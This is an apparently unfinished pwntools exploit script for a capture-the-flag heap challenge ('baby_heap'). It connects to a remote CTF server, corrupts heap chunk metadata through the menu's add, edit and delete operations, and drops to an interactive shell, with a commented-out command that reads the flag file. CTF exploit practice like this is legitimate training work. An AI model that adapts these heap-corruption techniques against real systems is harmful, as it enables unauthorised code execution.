#!/usr/bin/env python
from pwn import *

# 

host , port = 'ctf.yuawn.idv.tw' , 10207
y = remote( host , port )


context.arch = 'amd64'

e , l = ELF('./baby_heap') , ELF('./libc.so.6')

def add( name , pwd ):
    y.sendafter( 'ice:' , '1' )
    y.sendafter( ': ' , name )
    y.sendafter( ': ' , pwd )

def sho( idx ):
    y.sendafter( 'ice:' , '3' )

def edt( idx , name , pwd ):
    y.sendafter( 'ice:' , '2' )
    y.sendafter( ':' , str( idx ) )
    y.sendafter( ':' , name )
    y.sendafter( ':' , pwd )

def dle( idx ):
    y.sendafter( 'ice:' , '4' )
    y.sendafter( ':' , str( idx ) )


# 0x602130

add( 'a' * 0x10 , 'A' * 0x60 )
add( 'b' * 0x10 , 'B' * 0x60 )
add( 'b' * 0x8 + p64( 0x71 ) , 'B' * 0x60 )

edt( 0 , 'a' * 0x10 , 'A' * 0x10 )

dle( 1 )

edt( 0 , 'a' * 0x1 + '\x01' , 'A' * 0x10 )

#edt( 1 , 'b' * 0x10 , 'A' * 0x10 )

#sleep(1)

#y.sendline( 'cat /home/`whoami`/flag' )

y.interactive()